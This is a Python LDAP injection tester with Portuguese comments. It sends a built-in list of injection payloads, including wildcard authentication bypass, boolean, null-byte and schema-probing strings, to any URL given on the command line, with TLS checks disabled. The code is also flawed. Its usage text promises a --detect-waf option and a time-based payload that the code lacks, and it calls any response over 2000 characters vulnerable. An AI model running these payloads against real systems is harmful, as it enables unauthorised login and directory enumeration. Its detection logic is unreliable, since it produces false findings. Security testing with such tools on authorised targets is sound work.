#!/usr/bin/env python3
"""LDAP Injection Detector - Testa vulnerabilidades LDAP

Uso:
  python ldap-injection.py -u "http://example.com/search?user="
  python ldap-injection.py -u "http://example.com/login" -m POST -p "username"
  python ldap-injection.py -u "http://example.com" --detect-waf

LDAP Payloads:
  - Wildcard auth: *)(uid=*
  - Null byte: user*%00
  - Boolean-based: *)(|(uid=*
  - Time-based: *)(responseDelay=5000
"""
import sys
import argparse
import requests
import time
import json

class LDAPInjectionTester:
    def __init__(self, url, method='GET', timeout=10):
        self.url = url
        self.method = method
        self.timeout = timeout
        self.results = {
            'vulnerable': [],
            'tested': 0,
            'payloads_used': []
        }
        requests.packages.urllib3.disable_warnings()

    def generate_payloads(self):
        """Gera payloads LDAP injection."""
        payloads = [
            # Wildcard auth
            "*",
            "*)(&",
            "*))(|(uid=*",
            "*)(|(|(uid=*",

            # Comment variants
            "*)(|(uid=admin*",
            "*)(|(uid=*)*))(&(uid=*",

            # Boolean-based
            "admin*",
            "admin))(&(uid=admin",
            "admin*)(|(objectClass=*",

            # Null byte
            "admin*%00",
            "admin*\x00",

            # Attribute manipulation
            "*))(|(cn=*",
            "*))(|(mail=*",

            # Schema inference
            "admin*))(&(objectClass=*",
            "*)(|(objectClass=*",

            # Specific attacks
            "admin))%00",
            "admin*))%00",
            "*)(uid=admin",
            "*)(|(uid=admin",
        ]

        return payloads

    def test_ldap_injection(self, parameter, payloads=None):
        """Testa LDAP injection."""
        if not payloads:
            payloads = self.generate_payloads()

        print(f"\n[*] Testando {len(payloads)} payloads em '{parameter}'...")

        for i, payload in enumerate(payloads):
            self.results['tested'] += 1
            self.results['payloads_used'].append(payload)

            try:
                if self.method == 'GET':
                    test_url = self.url + payload if '?' in self.url else self.url + f"?{parameter}=" + payload
                    response = requests.get(test_url, timeout=self.timeout, verify=False)
                else:
                    data = {parameter: payload}
                    response = requests.post(self.url, data=data, timeout=self.timeout, verify=False)

                # Análise
                if self._check_vulnerability(payload, response):
                    self.results['vulnerable'].append({
                        'payload': payload,
                        'method': self.method,
                        'parameter': parameter,
                        'status': response.status_code,
                        'indication': 'Diferenças detectadas'
                    })
                    print(f"  [!] VULNÁVEL: {payload}")

                if (i + 1) % 10 == 0:
                    print(f"  [⏳] {i+1}/{len(payloads)} testados...")

            except requests.Timeout:
                # Possível time-based
                if 'Delay' in payload or 'responseDelay' in payload:
                    print(f"  [!] TIME-BASED: {payload}")
                    self.results['vulnerable'].append({
                        'payload': payload,
                        'type': 'Time-based',
                        'indication': 'Timeout detectado'
                    })
            except Exception as e:
                pass

        print(f"\n[+] Testados: {self.results['tested']}")
        print(f"[+] Vulneráveis encontradas: {len(self.results['vulnerable'])}")

    def _check_vulnerability(self, payload, response):
        """Verifica indicadores de vulnerabilidade."""
        indicators = [
            'LDAP',
            'Invalid',
            'syntax error',
            'objectClass',
            'uid=',
            'cn=',
            'distinguishedName'
        ]

        for indicator in indicators:
            if indicator.lower() in response.text.lower():
                return True

        # Detecta mudanças de resposta (boolean-based)
        if len(response.content) > 2000:
            return True

        return False

    def generate_report(self, output_file=None):
        """Gera relatório."""
        report = {
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'url': self.url,
            'summary': {
                'payloads_tested': self.results['tested'],
                'vulnerabilities': len(self.results['vulnerable'])
            },
            'vulnerabilities': self.results['vulnerable']
        }

        if output_file:
            with open(output_file, 'w') as f:
                json.dump(report, f, indent=2)
            print(f"\n[+] Relatório: {output_file}")

        return report

def main():
    parser = argparse.ArgumentParser(description="LDAP Injection Tester")
    parser.add_argument('-u', '--url', required=True, help='URL alvo')
    parser.add_argument('-p', '--param', default='username', help='Parâmetro')
    parser.add_argument('-m', '--method', default='GET', help='Método HTTP')
    parser.add_argument('-o', '--output', help='Arquivo JSON')

    args = parser.parse_args()

    print(f"\n{'='*70}")
    print(f"🔗 LDAP Injection Tester")
    print(f"{'='*70}\n")

    tester = LDAPInjectionTester(args.url, args.method)
    tester.test_ldap_injection(args.param)
    tester.generate_report(args.output)

    print("\n[✓] Teste completo!")

if __name__ == "__main__":
    main()
